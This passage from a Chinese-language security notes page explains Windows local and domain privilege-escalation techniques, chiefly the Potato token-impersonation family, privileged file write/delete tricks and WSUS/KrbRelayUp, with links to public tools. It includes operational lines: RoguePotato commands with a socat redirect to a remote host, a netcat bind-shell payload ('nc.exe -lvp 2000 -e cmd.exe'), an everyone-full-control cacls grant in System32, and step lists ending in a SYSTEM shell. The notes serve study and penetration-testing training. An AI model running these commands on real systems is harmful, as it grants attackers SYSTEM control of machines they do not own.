  <p>攻击方式：凭据窃取、提权、防御规避等。</p>
</blockquote>

<p><strong>9. SeTcbPrivilege</strong>
此权限将其持有者标识为受信任计算机库的一部分。某些受信任的受保护子系统被授予此特权。</p>

<blockquote>
  <p>攻击场景：权限提升</p>
</blockquote>

<p><strong>参考：</strong></p>
<ul>
  <li><a href="https://www.wangan.com/p/7fy747bffedd4919">Windows Token原理及利用 - 网安</a></li>
  <li><a href="https://www.thehackerworld.com/Hacker-topic/20369.html/">渗透技巧——利用Windows的九大权限 - WEB and server security vulnerabilities - 黑客中文论坛网站</a></li>
</ul>

<hr />

<p>基于 Token 提权的利用工具就是常用的 Potato 家族了：</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231120023623.png" alt="20231120023623" /></p>

<h3 id="origin-potatoms08-068">Origin Potato(MS08-068)</h3>
<p>Origin Potato 就是 NTLM-Relay，微软在 kb957097 补丁中通过修复 SMB 身份验证答复的验证方式来防止凭据重播。</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231120071554.png" alt="20231120071554" /></p>

<p>当主机 A 向主机 B 进行 SMB 认证的时候，将 pszTargetName 设置为 cifs/B，然后在 type2 拿到 B 发送的 Challenge 之后，在 lsass 里面缓存 (Challenge,cifs/B)，接着 B 拿到 A 的 type3，这时会去检查 lsass 缓存里是否有 (Challenge,cifs/B)，如果有就说明这是同一台主机，那么认证失败。</p>

<h3 id="hot-potato">Hot Potato</h3>
<p>Hot Potato 是 Potato 家族最早的利用方式，其攻击原理如下：</p>
<ol>
  <li>Windows Update 服务以 SYSTEM 权限运行，且会发起 NTLM 认证，如果能够作为中间人，我们就能够通过 NTLM Relay 获取到 SYSTEM 权限。</li>
  <li>Windows Update 服务在运行时会默认请求 http://wpad/wpad.dat 这个  URL 以获取网络代理的配置，但这个域名并不是所有主机都会配置，公网上也没有这个域名，根据 Windows 的域名解析顺序（host-&gt; DNS 查询 -&gt; NBNS 查询），只要攻击者伪造一个 NBNS 查询的响应，就能够控制 Windows Update 服务的代理指向自己。</li>
  <li>攻击者以中间人的身份完成 NTLM Relay 从而获取到 System 权限的 token。</li>
</ol>

<p>影响范围：</p>
<ul>
  <li>Windows 7,8,10,Server 2008 以及 Server 2012</li>
</ul>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231120023106.png" alt="20231120023106" /></p>

<p>其步骤如下：</p>
<ol>
  <li>Windows Update 服务默认情况下会请求 http://wpad/wpad.dat 来获取网络代理配置。但不是所有的主机都存在保存着该域名解析的结果，当本地 HOST 及 DNS 查询都无法获取该域名的解析结果时，就会触发 NBNS 查询。</li>
  <li>攻击者在本地发起 NBNS（NetBIOS 名称服务）欺骗。使得 Windows 在本地广播查询目标 HOST 时，攻击者伪造响应，声称 wpad 服务器 IP 地址为 127.0.0.1，并且返回网络代理配置为 127.0.0.1:80</li>
  <li>Windows Update 服务获取到网络代理后，所有的 http 流量就都会经过攻击者搭建的 127.0.0.1:80。</li>
  <li>此时 Windows Update 服务进行 NTLM 认证中的 Hash 就会被攻击者捕获，从而发起 NTLM Relay 攻击。</li>
</ol>

<p>局限：
这种攻击手法需要等待 windows update 服务发起更新请求。</p>

<h3 id="rotten-potato">Rotten Potato</h3>
<p>攻击原理：</p>
<ol>
  <li>COM （组件对象模型）API 可以在指定的网络位置加载一个服务对象。以下面的代码为例，COM API 函数 CoGetInstanceFromIStorage 会根据指定的 IP 地址和端口号 127.0.0.1:6666 去获取指定的对象实例，该对象实例的 Guid 为 4991d34b-80a1-4291-83b6-3328366b9097，对应 BITS 实例。如果此时攻击者在 127.0.0.1:6666 端口正常回复，就可以强制让 COM 以 SYSTEM 权限对 6666 端口发起 net-NTLM 认证。（为什么选择 BITS 实例，<strong>是因为 BITS 实现了 IMarshal 接口</strong>并允许代理声明强制 NTLM 身份验证）
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="n">public</span> <span class="k">static</span> <span class="kt">void</span> <span class="nf">BootstrapComMarshal</span><span class="p">()</span>
 <span class="p">{</span>
 <span class="n">IStorage</span> <span class="n">stg</span> <span class="o">=</span> <span class="n">ComUtils</span><span class="p">.</span><span class="n">CreateStorage</span><span class="p">();</span>
    
 <span class="c1">// Use a known local system service COM server, in this cast BITSv1</span>
 <span class="n">Guid</span> <span class="n">clsid</span> <span class="o">=</span> <span class="n">new</span> <span class="n">Guid</span><span class="p">(</span><span class="s">"4991d34b-80a1-4291-83b6-3328366b9097"</span><span class="p">);</span>
    
 <span class="n">TestClass</span> <span class="n">c</span> <span class="o">=</span> <span class="n">new</span> <span class="n">TestClass</span><span class="p">(</span><span class="n">stg</span><span class="p">,</span> <span class="n">String</span><span class="p">.</span><span class="n">Format</span><span class="p">(</span><span class="s">"{0}[{1}]"</span><span class="p">,</span> <span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="mi">6666</span><span class="p">));</span> <span class="c1">// ip and port</span>
    
 <span class="n">MULTI_QI</span><span class="p">[]</span> <span class="n">qis</span> <span class="o">=</span> <span class="n">new</span> <span class="n">MULTI_QI</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    
 <span class="n">qis</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">pIID</span> <span class="o">=</span> <span class="n">ComUtils</span><span class="p">.</span><span class="n">IID_IUnknownPtr</span><span class="p">;</span>
 <span class="n">qis</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">pItf</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
 <span class="n">qis</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">hr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    
 <span class="n">CoGetInstanceFromIStorage</span><span class="p">(</span><span class="n">null</span><span class="p">,</span> <span class="n">ref</span> <span class="n">clsid</span><span class="p">,</span> <span class="n">null</span><span class="p">,</span> <span class="n">CLSCTX</span><span class="p">.</span><span class="n">CLSCTX_LOCAL_SERVER</span><span class="p">,</span> <span class="n">c</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span>       <span class="n">qis</span><span class="p">);</span>
 <span class="p">}</span>
</code></pre></div>    </div>
  </li>
  <li>如果我们能够完成这一次 NTLM 认证，就可以获取到 token，<strong>作者也使用了一个巧妙的方法，调用 AcceptSecurityContext 函数来处理 NLTM 认证</strong>
    <ol>
      <li>AcceptSecurityContext 是 Windows API 中用于安全上下文建立的函数之一，特别是在使用安全套接字（Secure Socket Layer，SSL）或者安全的远程过程调用（Remote Procedure Call，RPC）等场景下。它通常用于在<strong>服务端接受来自客户端的身份验证</strong>，并建立一个安全上下文（security context）以便进行后续的安全通信。<strong>这样一来，COM 充当客户端，AcceptSecurityContext 充当服务端，就能够完成 NTLM 认证。</strong></li>
    </ol>
  </li>
  <li>尽管攻击者作为中间人将 AcceptSecurityContext 与 COM 之间建立起了 NTLM 认证，但两者之间的交互过程并不是简单的转发，主要有两个问题：
    <ol>
      <li>要正确响应 COM 服务，需要正确的 RPC 协议的数据包。作者将 <strong>COM 的请求发送到 135 端口的 rpcss 服务来获取一个响应模板</strong>。</li>
      <li>两个次 NTLM Challenge 报文中的 NTLM Server Challenge 以及 Reserved 字段不同，需要进行修改。</li>
    </ol>
  </li>
  <li>上述的两个问题解决之后，就可以巧妙地获取到 SYSTEM token。有了 SYSTEM 权限的 token 之后，如果当前用户拥有 SelmpersonatePrivilege 或者 SeAssignPrimaryToken 权限，就可以通过该 Token 创建新进程达成提权。</li>
</ol>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231120024104.png" alt="20231120024104" /></p>

<p>步骤如下：</p>
<ol>
  <li>利用 CoGetInstanceFromIStorage API 强制 NT AUTHORITY/SYSTEM 运行的 RPC 服务向我们的本地代理(localhost:6666)发起 NTLM 身份验证。
    <ol>
      <li>CoGetInstanceFromIStorage API</li>
    </ol>
  </li>
  <li>RPC 向代理发送 NTLM Negotiate 包。</li>
  <li>代理将 NTLM Negotiate 包转发给端口 135 的 RPC 服务。于此同时，调用 AcceptSecurityContext 来强制进行本地身份验证。</li>
  <li>RPC 135 和 AcceptSecurityContext 向代理发送 NTLM Challenge。两个数据包的内容被混合以匹配本地协商并转发到 RPC，其中 RPC 135 响应的报文充当 RPC 调用的模板。</li>
  <li>RPC 使用 NLTM Auth 包进行响应，该包被代理服务器发送到 AcceptSecurityContext (8.) 并执行模拟 (9.)。</li>
</ol>

<p>影响范围：</p>
<ul>
  <li>&lt; win10 1809 和 windows server 2019</li>
</ul>

<hr />
<p>相关概念：</p>
<ol>
  <li>分布式组件对象模型(DCOM)
    <ol>
      <li>COM 是 Windows 的一个组件，它促进了软件之间的互操作性，DCOM 通过远程过程调用(RPC)在网络上扩展了这一点。</li>
    </ol>
  </li>
  <li>后台智能传输服务(BITS) 可供程序员和系统管理员用于从 HTTP Web 服务器和 SMB 文件共享下载文件或将文件上传到其中。
    <ol>
      <li>Windows Update： BITS 服务用于下载和安装 Windows 更新。</li>
      <li>Windows Defender 病毒定义更新： BITS 用于后台更新 Windows Defender 病毒定义。</li>
      <li>应用程序和系统更新： 第三方应用程序和系统组件可以利用 BITS 进行后台更新。</li>
    </ol>
  </li>
  <li>
    <h2 id="clsid是标识-com-类对象的全局唯一标识符它是一个类似uuid的标识符">CLSID是标识 COM 类对象的全局唯一标识符。它是一个类似UUID的标识符。</h2>
  </li>
</ol>

<h3 id="juicy-potato">Juicy Potato</h3>
<p>Rotten Potato 的 PoC 使用了 COM 来激活 BITS 服务。Windows 在修补 Rotten Potato 时，禁用了 BITS 服务，并且占用了 6666 端口，但该修补并不能完全杜绝这类问题，作者找到了其他可以选择的 COM 对象，也可以发起 NTLM 请求。</p>

<p>其具体利用过程与 Rotten Potato 类似：</p>
<ol>
  <li>Juicy Potato 通过传递 BITS 的 CLSID 和 IStorage 对象实例给 CoGetInstanceFromIStorage 函数，使得 rpcss 激活 BITS 服务。</li>
  <li>随后 rpcss 的 DCOM OXID resolver 会解析序列化数据中的 OBJREF 拿到DUALSTRINGARRAY 字段，该字段指定了 host[port] 格式的 location，绑定对象时会向其中的 host[port] 发送 DEC/RPC 请求，这时，如果攻击者控制了这个端口，就可以要求进行 NTLM 身份验证，那么高权限服务就会发送 net-NTLM 进行认证。</li>
  <li>其后的过程与 Rotten Potato 一致</li>
</ol>

<p>影响范围：</p>
<ul>
  <li>&lt; Windows 10 1809</li>
  <li>&lt; Windows Server 2019</li>
</ul>

<h3 id="pipe-potatoprintspoofer">Pipe Potato（PrintSpoofer）</h3>
<p><strong>命名管道提权原理</strong>：
windows 中有一个 API ImpersonateNamedPipeClient()，允许服务端进程对连接到它的客户端进程进行模拟。通过调用 ImpersonateNamedPipeClient()，命名管道服务端可以模拟命名管道客户端的安全上下文，从而直接将命名管道服务端当前线程的 Token 令牌更改为命名管道客户端的 Token令牌。</p>

<p>因此命名管道提权的原理大多类似，一般是诱使 system 权限的服务访问我们创建的命名管道。</p>

<p><strong>PrintSpoofer 原理</strong>：</p>

<p>Windows 的 MS-RPRN 协议用于打印客户机和打印服务器之间的通信，默认情况下启用。同时，Print Spooler 服务的 RPC 接口暴露在命名管道：\.\pipe\spoolss 中，该服务默认开启。</p>

<p>MS-RPRN 协议定义的 RpcRemoteFindFirstPrinterChangeNotificationEx() 函数创建一个远程更改通知对象，该对象监视对打印机对象的更改，并将更改通知发送到打印客户端，并且就是通过命名管道实现进程之间的通信。</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="n">RpcRemoteFindFirstPrinterChangeNotificationEx</span><span class="p">(</span> 
    <span class="cm">/* [in] */</span> <span class="n">PRINTER_HANDLE</span> <span class="n">hPrinter</span><span class="p">,</span>
    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">fdwFlags</span><span class="p">,</span>
    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">fdwOptions</span><span class="p">,</span>
    <span class="cm">/* [unique][string][in] */</span> <span class="kt">wchar_t</span> <span class="o">*</span><span class="n">pszLocalMachine</span><span class="p">,</span>
    <span class="cm">/* [in] */</span> <span class="n">DWORD</span> <span class="n">dwPrinterLocal</span><span class="p">,</span>
    <span class="cm">/* [unique][in] */</span> <span class="n">RPC_V2_NOTIFY_OPTIONS</span> <span class="o">*</span><span class="n">pOptions</span><span class="p">)</span>

</code></pre></div></div>
<p>其中 pszLocalMachine 是指向表示客户端计算机名称的字符串的指针，需要传递一个 UNC 路径，传递 \127.0.0.1 时，服务器会访问 \127.0.0.1\pipe\spoolss，但这个管道已经被系统注册了，并由 NT AUTHORITY\SYSTEM 控制。如果我们传入是 \127.0.0.1\pipe\demo， spoolsv.exe 进程也会对Server name做了校验，最后还是会替换成 \192.168.110.137\pipe\spools 管道。</p>

<p>作者在这里利用了 windows UNC 路径规范化的技巧绕过了这个限制</p>

<p>考虑到 UNC 路径的性质，如果主机名包含 /，它将通过路径检查，但真正连接的时候会转化为 \ 。那么，如果传递一个 \127.0.0.1/pipe/foo，检查时会认为 127.0.0.1/pipe/foo 是一个主机名，随后在连接 named pipe 时会对参数做标准化，于是就会连接 \127.0.0.1\pipe\foo\pipe\spoolss，那么攻击者就可以把主机名改为 \127.0.0.1/pipe/foo 并注册这个 named pipe 从而窃取 client 的 token。</p>

<p>利用工具：</p>
<ul>
  <li><a href="https://github.com/itm4n/PrintSpoofer">itm4n/PrintSpoofer: Abusing impersonation privileges through the “Printer Bug”</a></li>
</ul>

<p>参考：</p>
<ul>
  <li><a href="https://paper.seebug.org/2090/">Windows 命名管道客户端模拟和 PrintSpoofer 原理探究</a></li>
</ul>

<h3 id="bad-potato">Bad Potato</h3>
<p>BadPotato是C#版本的PrintSpooler，结构代码也更加简化，并且恶意管道服务端用的是对方机器的名字，而PrintSpooler用的是随机生成的UUID，pipePotato则是固定的”xxx”（导致可用性也更低）</p>

<p>利用工具：</p>
<ul>
  <li><a href="https://github.com/BeichenDream/BadPotato">BeichenDream/BadPotato: Windows 权限提升 BadPotato</a></li>
</ul>

<h3 id="rogue-potato">Rogue Potato</h3>
<p>为了修补 Juicy Potato，高版本的 Windows DCOM 解析器不允许 OBJREF 中的 DUALSTRINGARRAY 字段指定端口号。</p>

<p><strong>利用条件：</strong></p>
<ol>
  <li>我们需要有一台机器在我们的控制之下，我们可以在其中执行重定向，并且受害者必须可以在端口 135上访问该机器</li>
  <li>我们需要上传两个 exe 文件，当受害者的防火墙不接受传入连接时，也可以在我们控制的 Windows 机器上以独立模式启动伪造的 OXID 解析器</li>
</ol>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231120041332.png" alt="20231120041332" /></p>

<p>利用思路：</p>
<ol>
  <li>
    <p>Rogue Potato 的利用思路是在远程服务器的 135 端口上做一个转发，用于将 OXID 解析请求重定向到一个假的OXID RPC 服务器。</p>
  </li>
  <li>
    <p>伪造的OXID RPC 服务器实现了ResolveOxid2服务器过程，该过程将指向受控命名管道[ncacn_np:localhost/pipe/roguepotato[\pipe\epmapper]</p>
  </li>
  <li>
    <p>DCOM 服务器将连接到 RPC 服务器以执行 IRemUnkown2 接口调用。通过连接到命名管道，将执行”身份验证回调”，我们可以通过 RpcImpersonateClient()调用模拟调用者。</p>
  </li>
  <li>
    <p>然后,令牌窃取者
  1.获取rpcss服务的PID
  2.打开进程，列出所有句柄，并为每个句柄尝试复制它并获取句柄类型
  3.如果句柄类型为”Token”且令牌所有者为 SYSTEM，则尝试使用CreatProcessAsUser()或CreateProcessWithToken()模拟并启动进程</p>
  </li>
</ol>

<p><strong>影响范围：</strong></p>
<ul>
  <li>&gt;= Windows 10 1809 &amp; Windows Server 2019</li>
</ul>

<p>利用工具：</p>
<ul>
  <li>https://github.com/antonioCoco/RoguePotato</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Network redirector / port forwarder to run on your remote machine, must use port 135 as src port</span>
socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999

<span class="c"># RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. </span>
<span class="c"># Use this if you have fw restrictions.</span>
RoguePotato.exe <span class="nt">-r</span> 10.0.0.3 <span class="nt">-e</span> <span class="s2">"C:</span><span class="se">\w</span><span class="s2">indows</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">md.exe"</span>

<span class="c"># RoguePotato all in one with RogueOxidResolver running locally on port 9999</span>
RoguePotato.exe <span class="nt">-r</span> 10.0.0.3 <span class="nt">-e</span> <span class="s2">"C:</span><span class="se">\w</span><span class="s2">indows</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">md.exe"</span> <span class="nt">-l</span> 9999

<span class="c">#RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename</span>
RoguePotato.exe <span class="nt">-r</span> 10.0.0.3 <span class="nt">-e</span> <span class="s2">"C:</span><span class="se">\w</span><span class="s2">indows</span><span class="se">\s</span><span class="s2">ystem32</span><span class="se">\c</span><span class="s2">md.exe"</span> <span class="nt">-l</span> 9999 <span class="nt">-c</span> <span class="s2">"{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}"</span> <span class="nt">-p</span> splintercode
</code></pre></div></div>

<h3 id="efspotatopetitpotam">EfsPotato（PetitPotam）</h3>
<p>利用EFSRPC（加密文件系统远程协议），进行NTLM中继攻击可实现AD域内权限提升或本地权限提升。</p>

<p>影响范围：
    Windows Server, version 20H2 (Server Core Installation)
    Windows Server, version 2004 (Server Core installation)
    Windows Server 2019  (Server Core installation)
    Windows Server 2019
    Windows Server 2016  (Server Core installation)
    Windows Server 2016
    Windows Server 2012 R2 (Server Core installation)
    Windows Server 2012 R2
    Windows Server 2012 (Server Core installation)
    Windows Server 2012
    Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for x64-based Systems Service Pack 2
    Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
    Windows Server 2008 for 32-bit Systems Service Pack 2
    Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
    Windows Server 2008 R2 for x64-based Systems Service Pack 1</p>

<p>利用工具：</p>
<ul>
  <li><a href="https://github.com/zcgonvh/EfsPotato">zcgonvh/EfsPotato: Exploit for EfsPotato(MS-EFSR EfsRpcOpenFileRaw with SeImpersonatePrivilege local privalege escalation vulnerability).</a></li>
  <li><a href="https://github.com/bugch3ck/SharpEfsPotato">bugch3ck/SharpEfsPotato: Local privilege escalation from SeImpersonatePrivilege using EfsRpc.</a></li>
</ul>

<h3 id="ghost-potatoms08-068-绕过">Ghost potato（MS08-068 绕过）</h3>
<p>为防止用户 relay 本机，在 lsass 中添加缓存绕过，如果缓存中有 (Challenge,cifs/B) 就会认证失败。
然而这个 (Challenge,cifs/B) 是有时效性的（300s），所有只要等 300s 再发送 type3 就可以 bypass 了。</p>

<p>用修改后的 impacket https://shenaniganslabs.io/files/impacket-ghostpotato.zip 可以直接打，用法和MS08-068 类似。</p>

<h3 id="sweet-potato">Sweet Potato</h3>
<p>集成了前面几种土豆触发 NTLM 认证的方式，包括：COM，WinRM，Spoolsv，其中 WInRM 的攻击原理参考：https://decoder.cloud/2019/12/06/we-thought-they-were-potatoes-but-they-were-beans/</p>

<p>大致思路就是当 WinRM 在当前系统未启用时，攻击者监听本机 5985 端口，BITS 服务会向 WinRM 5985 发起 NTLM 认证。</p>

<ul>
  <li>RottenPotato</li>
  <li>Weaponized JuciyPotato with BITS WinRM discovery</li>
  <li>PrintSpoofer discovery and original exploit</li>
  <li>EfsRpc built on EfsPotato</li>
  <li>PetitPotam</li>
</ul>

<p>利用工具：<a href="https://github.com/CCob/SweetPotato">CCob/SweetPotato: Local Service to SYSTEM privilege escalation from Windows 7 to Windows 10 / Server 2019</a></p>

<h3 id="generic-potato">Generic Potato</h3>

<p>SweetPotato 的修改版本， 是@micahvandeusen 用于支持通过 HTTP 和/或命名管道模拟身份验证。</p>

<p>这允许从 SSRF 和/或文件写入进行本地权限升级。 在以下情况下它很方便：</p>

<ol>
  <li>我们有权访问的用户拥有 SeImpersonatePrivilege</li>
  <li>系统没有运行打印服务，这会阻止 SweetPotato 。</li>
  <li>WinRM 正在运行以防止 RogueWinRM</li>
  <li>您不允许对您控制的任何计算机进行出站 RPC，并且禁用 BITS 服务以防止 RoguePotato 。</li>
</ol>

<p>利用工具：</p>
<ul>
  <li><a href="https://github.com/micahvandeusen/GenericPotato">micahvandeusen/GenericPotato: Impersonating authentication over HTTP and/or named pipes.</a></li>
</ul>

<h3 id="juicypotatong">JuicyPotatoNG</h3>
<ul>
  <li><a href="https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/">Giving JuicyPotato a second chance: JuicyPotatoNG – Decoder’s Blog</a></li>
</ul>

<p>利用工具：</p>
<ul>
  <li><a href="https://github.com/antonioCoco/JuicyPotatoNG">antonioCoco/JuicyPotatoNG: Another Windows Local Privilege Escalation from Service Account to System</a></li>
</ul>

<h3 id="godpotato">GodPotato</h3>
<p>影响范围：</p>
<ul>
  <li>Windows Server 2012 - Windows Server 2022</li>
  <li>Windows8 - Windows 11</li>
</ul>

<p>利用工具：</p>
<ul>
  <li><a href="https://github.com/BeichenDream/GodPotato">BeichenDream/GodPotato</a></li>
</ul>

<h3 id="靶场">靶场</h3>
<ul>
  <li>Juicy Potato - HackTheBox-Jeeves</li>
  <li>Rogue Potato - HackTheBox-Remote</li>
</ul>

<p>参考：</p>
<ul>
  <li><a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc">Potatoes - Windows Privilege Escalation · Jorge Lajara Website</a></li>
  <li><a href="https://www.geekby.site/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/#2-hot-potato">Potato 家族提权分析 - Geekby’s Blog</a></li>
  <li><a href="https://blog.csdn.net/qq_42045349/article/details/118225426">【精选】Rotten/Juicy Potato提权工原理分析_rottenpotato-CSDN博客</a></li>
  <li><a href="http://moonflower.fun/index.php/2022/05/01/329/">Potato 家族提权学习</a></li>
  <li><a href="https://blog.csdn.net/qq_41874930/article/details/108825010">NTLM-relay攻击的原理与实现</a></li>
  <li><a href="https://paper.seebug.org/2090/">Windows 命名管道客户端模拟和 PrintSpoofer 原理探究</a></li>
</ul>

<h2 id="通过特权文件写入提权">通过特权文件写入提权</h2>
<h3 id="diaghub">DiagHub</h3>
<blockquote>
  <p>从版本 1903 及更高版本开始，DiagHub 不能再用于加载任意 DLL。</p>
</blockquote>

<p>Microsoft 诊断中心标准收集器服务 (DiagHub) 是一项收集跟踪信息并通过 DCOM 以编程方式公开的服务。</p>

<p>该 DCOM 对象可用于将 DLL 加载到 SYSTEM 进程中，前提是该 DLL 存在于 C:\Windows\System32 目录中。</p>

<p>利用步骤：</p>
<ol>
  <li>创建一个邪恶的 DLL 例如：payload.dll 并将其移至 C:\Windows\System32</li>
  <li>build https://github.com/xct/diaghub</li>
  <li>diaghub.exe c:\ProgramData\ Payload.dll</li>
</ol>

<p>默认有效负载将运行 C:\Windows\System32\spool\drivers\color\nc.exe -lvp 2000 -e cmd.exe</p>

<h3 id="usodllloader">UsoDLLLoader</h3>
<blockquote>
  <p>2020-06-06 更新：此技巧不再适用于最新版本的 Windows 10 Insider Preview。</p>
</blockquote>

<p>如果我们在 Windows 或某些第三方软件中发现特权文件写入漏洞，我们可以将自己版本的 windowscoredeviceinfo.dll 复制到 C:\Windows\Sytem32\中，然后让 USO 服务以 NT AUTHORITY\System 的身份加载它。</p>

<p>利用步骤：</p>
<ol>
  <li>构建 https://github.com/itm4n/UsoDllLoader
    <ol>
      <li>选择发布配置和 x64 架构。</li>
      <li>构建解决方案。
        <ol>
          <li>DLL .\x64\Release\WindowsCoreDeviceInfo.dll</li>
          <li>加载程序.\x64\Release\UsoDllLoader.exe。</li>
        </ol>
      </li>
    </ol>
  </li>
  <li>将 WindowsCoreDeviceInfo.dll 复制到 C:\Windows\System32\</li>
  <li>使用加载程序并等待 shell 或运行 usoclient StartInteractiveScan 并连接到端口 1337 上的绑定 shell。</li>
</ol>

<h3 id="wertrigger">WerTrigger</h3>
<p>利用 Windows 问题报告写入特权。</p>

<p>利用步骤：</p>
<ol>
  <li>克隆 https://github.com/sailay1996/WerTrigger</li>
  <li>将 phoneinfo.dll 复制到C:\Windows\System32\</li>
  <li>将 Report.wer 文件和 WerTrigger.exe 放在同一目录中。</li>
  <li>然后，运行 WerTrigger.exe。</li>
  <li>享受 NT AUTHORITY\SYSTEM 的 shell</li>
</ol>

<h3 id="wermgr">WerMgr</h3>
<p>利用 Windows 错误报告的特权目录创建错误达成提权</p>

<p>利用步骤：</p>
<ol>
  <li>Clone https://github.com/binderlabs/DirCreate2System</li>
  <li>Create directory C:\Windows\System32\wermgr.exe.local\</li>
  <li>Grant access to it: cacls C:\Windows\System32\wermgr.exe.local /e /g everyone:f</li>
  <li>Place spawn.dll file and dircreate2system.exe in a same directory and run .\dircreate2system.exe.</li>
  <li>Enjoy a shell as NT AUTHORITY\SYSTEM</li>
</ol>

<h2 id="通过特权文件删除提权">通过特权文件删除提权</h2>
<p>在 MSI 安装期间，Windows Installer 服务会维护每个更改的记录，以防需要回滚，为此它将创建：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> C:\Config.Msi 中的文件夹包含
     回滚脚本 (.rbs)
     回滚文件 (.rbf)
</code></pre></div></div>

<p>要将特权文件删除转换为本地权限提升，您需要滥用 Windows Installer 服务。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> Windows Installer 创建受保护的 C:\Config.Msi 文件夹后立即将其删除
 重新创建具有弱 DACL 权限的 C:\Config.Msi 文件夹，因为普通用户可以在 C:\ 根目录下创建文件夹。
 将恶意 .rbs 和 .rbf 文件放入其中，以便由 MSI 回滚执行
 然后在回滚时，Windows Installer 将对系统进行任意更改
</code></pre></div></div>

<p>触发此链的最简单方法是使用 zdi/FilesystemEoPs/FolderOrFileDeleteToSystem。  该漏洞利用包含一个具有 2 个操作的 .msi 文件，第一个操作会产生延迟，第二个操作会引发错误以使其回滚。  此回滚将“恢复”C:\Program Files\Common Files\microsoft shared\ink\HID.dll 中的恶意 HID.dll。</p>

<p>然后使用 [CTRL]+[ALT]+[DELETE] 切换到安全桌面并打开屏幕键盘 (osk.exe)。  osk.exe进程首先查找C:\Program Files\Common Files\microsoft共享\ink\HID.dll库而不是C:\Windows\System32\HID.dll</p>

<h1 id="windows-域内提权">Windows 域内提权</h1>
<h2 id="wsus">WSUS</h2>
<p>WSUS 是微软推出的免费的 Windows 更新管理服务，当我们获得了WSUS服务器的控制权限后，可以通过推送补丁的方式进行横向移动。这个利用方法最早公开在BlackHat USA 2015。</p>

<p>利用工具</p>
<ul>
  <li>https://github.com/nettitude/SharpWSUS</li>
  <li>https://github.com/AlsidOfficial/WSUSpendu</li>
  <li>https://github.com/ThunderGunExpress/Thunder_Woosus</li>
</ul>

<p>以上三个工具的实现原理基本相同，都是创建一个调用psexec执行命令的补丁，将补丁推送至指定计算机，等待目标计算机更新补丁</p>

<ul>
  <li><a href="https://www.4hou.com/shop/posts/nJAP">嘶货</a></li>
</ul>

<h2 id="krbrelayup">KrbRelayUp</h2>
<p>CVE-2022–26923 域内提权漏洞。</p>

<p>这本质上是在不强制执行 LDAP 签名（默认设置）的 Windows 域环境中的通用无修复本地权限升级。</p>

<p>这意味着每台域内 Windows 主机都只要未更改默认设置并强制执行 LDAP 签名设置，就容易受到攻击。最酷的是，不需要拥有特殊权限或成为管理员。</p>

<ul>
  <li>
    <table>
      <tbody>
        <tr>
          <td>[No-Fix Local Privilege Escalation Using KrbRelay With Shadow Credentials</td>
          <td>Icyguider’s Blog](https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html)</td>
        </tr>
      </tbody>
    </table>
  </li>
  <li>
    <table>
      <tbody>
        <tr>
          <td>[From unprivileged user to system - KrbRelayUp</td>
          <td>wwwGeneral](https://wwwgeneral.github.io/posts/from-unprivileged-user-to-system-krbrelayup/)</td>
        </tr>
      </tbody>
    </table>
  </li>
</ul>

<h1 id="参考资料">参考资料</h1>
<ul>
  <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---looting-for-passwords">PayloadsAllTheThings/Methodology and Resources/Windows - Privilege Escalation.md at master · swisskyrepo/PayloadsAllTheThings</a></li>
  <li><a href="https://www.freebuf.com/articles/web/281863.html">手把手教你Windows提权 - FreeBuf网络安全行业门户</a></li>
  <li><a href="https://github.com/alphaSeclab/windows-security/blob/master/Readme_full.md#f39e40e340f61ae168b67424baac5cc6">windows-security/Readme_full.md at master · alphaSeclab/windows-security</a></li>
